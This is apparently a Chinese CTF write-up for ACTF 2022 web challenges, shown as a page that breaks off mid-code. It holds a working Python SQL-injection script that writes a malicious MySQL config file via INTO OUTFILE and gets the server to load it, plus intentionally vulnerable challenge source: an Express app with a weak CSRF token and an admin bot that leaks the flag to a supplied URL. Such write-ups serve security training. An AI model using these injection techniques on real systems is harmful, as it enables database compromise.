json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://localhost:10047/index.php?key=3&amp;value=&quot;</span></span><br><span class="line"><span class="comment"># result = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     i = i + 1</span></span><br><span class="line"><span class="comment">#     head = 1</span></span><br><span class="line"><span class="comment">#     tail = 128</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     while head &lt; tail:</span></span><br><span class="line"><span class="comment">#         mid = (head + tail) &gt;&gt; 1</span></span><br><span class="line"><span class="comment">#         payload=f&quot;select if(ascii(substr((select @@global.secure_file_priv),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.2),0)&quot;</span></span><br><span class="line"><span class="comment">#         t1=time.time()</span></span><br><span class="line"><span class="comment">#         r=requests.get(url=url+payload)</span></span><br><span class="line"><span class="comment">#         t2=time.time()</span></span><br><span class="line"><span class="comment">#         print(t2-t1)</span></span><br><span class="line"><span class="comment">#         if t2-t1&gt;0.2:</span></span><br><span class="line"><span class="comment">#             head = mid + 1</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             tail = mid</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     if head != 1:</span></span><br><span class="line"><span class="comment">#         result += chr(head)</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     print(result)</span></span><br><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:10047/index.php&quot;</span></span><br><span class="line">payload = []</span><br><span class="line">with open(<span class="string">&quot;out2.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) as f:<span class="comment">#evilmy.cnf的十六进制</span></span><br><span class="line">    file_data = f.read()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">while i &lt; len(file_data):</span><br><span class="line">    if i + <span class="number">1000</span> &gt; len(file_data):</span><br><span class="line">        values = file_data[i:]</span><br><span class="line">    else:</span><br><span class="line">        values = file_data[i:i + <span class="number">1000</span>]</span><br><span class="line">    i = i + <span class="number">1000</span></span><br><span class="line">    j = j + <span class="number">1</span></span><br><span class="line">    payload+=[values]</span><br><span class="line">print(len(payload))</span><br><span class="line"><span class="comment">#分块长度，1000个十六进制，500个字符</span></span><br><span class="line">length = int(<span class="number">500</span>)</span><br><span class="line"><span class="comment">#生成分块文件的sql语句</span></span><br><span class="line">filenames = []</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">for v in payload:</span><br><span class="line">    filename = <span class="string">&quot;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIS&quot;</span>+str(i)</span><br><span class="line">    filenames += [filename]</span><br><span class="line">    sql = <span class="string">&quot;select 0x&quot;</span>+v+<span class="string">&quot; into outfile &#x27;&quot;</span>+filename+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    print(sql)</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;key&quot; : 3,</span><br><span class="line">        &quot;value&quot; : <span class="attribute">sql</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url,params)</span><br><span class="line">    print(resp.text)</span><br><span class="line"><span class="comment">#文件合并</span></span><br><span class="line">sqlinit = <span class="string">&quot;select 0x&quot;</span>+payload[<span class="number">1</span>]+<span class="string">&quot; into outfile &#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp1&#x27;&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">        &quot;key&quot; : 3,</span><br><span class="line">        &quot;value&quot; : <span class="attribute">sqlinit</span></span><br><span class="line">    &#125;</span><br><span class="line">resp = requests.get(url,params)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">for v in filenames:</span><br><span class="line">    if i==len(filenames)-<span class="number">1</span>:</span><br><span class="line">        <span class="literal">break</span></span><br><span class="line">    sql2 = <span class="string">&quot;select concat_ws(&#x27;&#x27;,(select substr(load_file(&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp&quot;</span>+str(i)+<span class="string">&quot;&#x27;),1,&quot;</span>+str(length*(i))+<span class="string">&quot;)),(select substr(load_file(&#x27;&quot;</span>+filenames[i+<span class="number">1</span>]+<span class="string">&quot;&#x27;),1,&quot;</span>+str(length)+<span class="string">&quot;)))  into outfile &#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp&quot;</span>+str(i+<span class="number">1</span>)+<span class="string">&quot;&#x27;;&quot;</span></span><br><span class="line">    print(sql2)</span><br><span class="line">    params = &#123;</span><br><span class="line">        &quot;key&quot;: 3,</span><br><span class="line">        &quot;value&quot;: <span class="attribute">sql2</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.get(url, params)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">sqlinit = <span class="string">&quot;select concat_ws(&#x27;&#x27;,(select substr(load_file(&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIS0&#x27;),1,505)),(select substr(load_file(&#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp62&#x27;),1,30525)))  into outfile &#x27;/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp63.cnf&#x27;;&quot;</span><span class="comment">#自己debug一下长度</span></span><br><span class="line">params = &#123;</span><br><span class="line">        &quot;key&quot; : 3,</span><br><span class="line">        &quot;value&quot; : <span class="attribute">sqlinit</span></span><br><span class="line">    &#125;</span><br><span class="line">resp = requests.get(url,params)</span><br><span class="line">requests.get(url+<span class="string">&quot;?key=4&amp;value=/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp63.cnf&quot;</span>)</span><br><span class="line">requests.get(url+<span class="string">&quot;?key=4&amp;value=/tmp/e10adc3949ba59abbe56e057f20f883e/ROIStmp63.cnf&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1678257724026-334bda38-bd14-41a5-8024-e5c590133bbd.png#averageHue=%2335342a&clientId=ua8932873-634a-4&from=paste&height=249&id=uc381b2dc&name=image.png&originHeight=311&originWidth=1150&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=476893&status=done&style=none&taskId=u5fa60ebe-96be-4ece-b62e-e41bfdf05e0&title=&width=920" alt="image.png"><br>这里需要注意一下这个py脚本需要自己手动调一下，在注释部分说了，有可能文件大小和py脚本一样，这时候就需要自己手动调整一下<code>ROIStmpxxx</code>后面的数字<br>在这里遇到了个小问题就是load_file为null，这是my.cnf文件没有配置secure_priv选项</p>
<p>其实这一题还有一个比较有意思的思路，就是完全仿照TQLCTF的思路，自己手动传个phar上去，然后再更改密码或者是FULSH PRIVILEGES触发phar反序列化，这里可以参考葵的尝试：<br><a target="_blank" rel="noopener" href="https://amiaaaz.github.io/2022/07/07/actf2022-wp/#myclient">https://amiaaaz.github.io/2022/07/07/actf2022-wp/#myclient</a><br>还是比较好玩的好吧</p>
<h1 id="BeWhatYouWannaBe"><a href="#BeWhatYouWannaBe" class="headerlink" title="BeWhatYouWannaBe"></a>BeWhatYouWannaBe</h1><p>考点：DOM破坏<br>三个源码文件，都是js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)()</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> admin = <span class="built_in">require</span>(<span class="string">&#x27;./admin&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> rand = <span class="built_in">require</span>(<span class="string">&#x27;string-random&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LISTEN</span> = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8000</span></span><br><span class="line"><span class="keyword">const</span> config = <span class="built_in">require</span>(<span class="string">&#x27;./config&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = config.<span class="property">FLAG</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FAKE_FLAG</span> = config.<span class="property">FAKE_FLAG</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MONGO_URL</span> = <span class="string">&#x27;mongodb://mongodb:27017/ctf&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET</span> = <span class="title function_">rand</span>(<span class="number">32</span>, <span class="string">&#x27;0123456789abcdef&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ValidateToken</span> = (<span class="params">Token</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">var</span> sha256 = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> sha256.<span class="title function_">update</span>(<span class="title class_">Math</span>.<span class="title function_">sin</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>)).<span class="title function_">toString</span>()).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>) === <span class="title class_">Token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="variable constant_">MONGO_URL</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = mongoose.<span class="title function_">model</span>(<span class="string">&quot;users&quot;</span>, <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">isAdmin</span>: <span class="title class_">Boolean</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="variable constant_">SECRET</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">secure</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">&#125;))</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/admin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> url = req.<span class="property">body</span>.<span class="property">url</span> ? req.<span class="property">body</span>.<span class="property">url</span> : <span class="string">&#x27;http://pumpk1n.com&#x27;</span></span><br><span class="line">    admin.<span class="title function_">view</span>(url)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; res.<span class="title function_">send</span>(url) &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; res.<span class="title function_">send</span>(e) &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123; <span class="attr">user</span>: req.<span class="property">session</span>.<span class="property">user</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;login&quot;</span>, username, password)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&quot;wafed&quot;</span> &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">User</span>.<span class="title function_">find</span>(&#123; <span class="attr">username</span>: username, <span class="attr">password</span>: password &#125;, <span class="function">(<span class="params">err, user</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&quot;login failed&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123;&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&quot;wafed&quot;</span> &#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> newuser = <span class="keyword">new</span> <span class="title class_">User</span>(&#123;</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">password</span>: password,</span><br><span class="line">        <span class="attr">isAdmin</span>: <span class="literal">false</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title class_">User</span>.<span class="title function_">find</span>(&#123; <span class="attr">username</span>: username &#125;, <span class="function">(<span class="params">err, user</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: err &#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;register&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&quot;user already exists!&quot;</span> &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            newuser.<span class="title function_">save</span>()</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/beAdmin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span> != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;sorry, only admin can be admin&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">const</span> csrftoken = req.<span class="property">body</span>.<span class="property">csrftoken</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">ValidateToken</span>(csrftoken)) &#123;</span><br><span class="line">        <span class="title class_">User</span>.<span class="title function_">updateMany</span>(&#123; <span class="attr">username</span>: username &#125;, &#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            <span class="function">(<span class="params">err, users</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;something error when being admin&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (users.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;no one can be admin&#x27;</span>)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;wow success wow&#x27;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;validate error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="variable constant_">FAKE_FLAG</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">user</span> &#125;, <span class="function">(<span class="params">err, user</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(&#123; <span class="attr">err</span>: err &#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (user.<span class="property">isAdmin</span>) &#123;</span><br><span class="line">            <span class="comment">// part 1</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="variable constant_">FLAG</span>.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">16</span>))</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="variable constant_">FAKE_FLAG</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="variable constant_">LISTEN</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`listening <span class="subst">$&#123;LISTEN&#125;</span>:<span class="subst">$&#123;PORT&#125;</span>...`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> process = <span class="built_in">require</span>(<span class="string">&#x27;process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ADMIN_USERNAME</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ADMIN_PASSWORD</span> = process.<span class="property">env</span>.<span class="property">password</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FLAG</span> = <span class="built_in">require</span>(<span class="string">&#x27;./config&#x27;</span>).<span class="property">FLAG</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">view</span> = <span class="keyword">async</span>(<span class="params">url</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">        <span class="comment">// page.on(&#x27;console&#x27;, msg =&gt; console.log(msg.text()))</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://localhost:8000/login&#x27;</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&quot;#username&quot;</span>, <span class="variable constant_">ADMIN_USERNAME</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&quot;#password&quot;</span>, <span class="variable constant_">ADMIN_PASSWORD</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&#x27;#btn-login&#x27;</span>)</span><br><span class="line">        <span class="comment">// get flag1</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">timeout</span>: <span class="number">5000</span> &#125;)</span><br><span class="line">        <span class="comment">// get flag2</span></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setJavaScriptEnabled</span>(<span class="literal">false</span>)</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">timeout</span>: <span class="number">5000</span> &#125;)</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">url, FLAG</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fff.<span class="property">lll</span>.<span class="property">aaa</span>.<span class="property">ggg</span>.<span class="property">value</span> == <span class="string">&quot;this_is_what_i_want&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">fetch</span>(url + <span class="string">&#x27;?part2=&#x27;</span> + <span class="title function_">btoa</span>(<span class="built_in">encodeURIComponent</span>(<span class="variable constant_">FLAG</span>.<span class="title function_">substring</span>(<span class="number">16</span>))));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">fetch</span>(url + <span class="string">&#x27;?there_is_no_flag&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, url, <span 